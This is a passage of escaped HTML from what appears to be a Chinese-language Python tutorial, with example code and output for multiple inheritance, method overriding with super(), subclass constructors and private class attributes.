    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;w&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;g&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;t&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        student&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__init__&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;w&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;g&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        speaker&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__init__&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;t&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
 
test &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; sample&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Tim&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Python&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
test&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;speak&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;#方法名同，默认调用的是在括号中排前地父类的方法&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
我叫 Tim，我是一个演说家，我演讲的主题是 Python
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;方法重写&#34;&gt;&lt;a href=&#34;#方法重写&#34; class=&#34;headerlink&#34; title=&#34;方法重写&#34;&gt;&lt;/a&gt;方法重写&lt;/h3&gt;&lt;p&gt;super() 函数是用于调用父类(超类)的一个方法&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Parent&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;        &lt;span class=&#34;token comment&#34;&gt;# 定义父类&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;myMethod&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
      &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;调用父类方法&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
 
&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Child&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Parent&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 定义子类&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;myMethod&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
      &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;调用子类方法&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
 
c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Child&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;          &lt;span class=&#34;token comment&#34;&gt;# 子类实例&lt;/span&gt;
c&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;myMethod&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;         &lt;span class=&#34;token comment&#34;&gt;# 子类调用重写方法&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Child&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;myMethod&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#用子类对象调用父类已被覆盖的方法&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
调用子类方法
调用父类方法
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;子类继承父类构造函数说明&#34;&gt;&lt;a href=&#34;#子类继承父类构造函数说明&#34; class=&#34;headerlink&#34; title=&#34;子类继承父类构造函数说明&#34;&gt;&lt;/a&gt;子类继承父类构造函数说明&lt;/h3&gt;&lt;p&gt;子类不重写 **_&lt;em&gt;init&lt;/em&gt;&lt;em&gt;**，实例化子类时，会自动调用父类定义的 **_&lt;em&gt;init&lt;/em&gt;&lt;/em&gt;**&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Father&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;name
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;name: %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Father &#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name
 
&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Son&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Father&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Son &#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name
 
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    son&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;Son&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; son&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;getName&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
name: runoob
Son runoob
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果重写了&lt;strong&gt;_&lt;em&gt;init&lt;/em&gt;_&lt;/strong&gt; 时，实例化子类，就不会调用父类已经定义的 &lt;strong&gt;_&lt;em&gt;init&lt;/em&gt;_&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果重写了&lt;strong&gt;_&lt;em&gt;init&lt;/em&gt;_&lt;/strong&gt; 时，要继承父类的构造方法，可以使用 &lt;strong&gt;super&lt;/strong&gt; 关键字&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token builtin&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;子类，self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__init__&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;参数&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;，参数&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;，&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;还有一种经典写法&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;父类名称&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__init__&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;参数&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;，参数&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;，&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Father&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;name
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;name: %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Father &#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name
 
&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Son&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Father&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token builtin&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Son&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__init__&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;hi&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;  name
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Son &#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name
 
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    son&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;Son&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; son&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;getName&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
name: runoob
hi
Son runoob
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;类属性与方法&#34;&gt;&lt;a href=&#34;#类属性与方法&#34; class=&#34;headerlink&#34; title=&#34;类属性与方法&#34;&gt;&lt;/a&gt;类属性与方法&lt;/h3&gt;&lt;h4 id=&#34;类的私有属性&#34;&gt;&lt;a href=&#34;#类的私有属性&#34; class=&#34;headerlink&#34; title=&#34;类的私有属性&#34;&gt;&lt;/a&gt;类的私有属性&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;__private_attrs&lt;/strong&gt;：两个下划线开头，声明该属性为私有，不能在类的外部被使用或直接访问。在类内部的方法中使用时 &lt;strong&gt;self.__private_attrs&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;JustCounter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    __secretCount &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 私有变量&lt;/span&gt;
    publicCount &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;# 公开变量&lt;/span&gt;
 
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__secretCount &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;publicCount &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__secretCount&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
 
counter &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; JustCounter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
counter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;count&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
counter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;count&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;counter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;publicCount&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;counter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__secretCount&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 报错，实例不能访问私有变量&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
1
2
2
Traceback (most recent call last):
  File &#34;test.py&#34;, line 16, in &amp;lt;module&amp;gt;
    print (counter.__secretCount)  # 报错，实例不能访问私有变量
AttributeError: &#39;JustCounter&#39; object has no attribute &#39;__secretCount&#39;
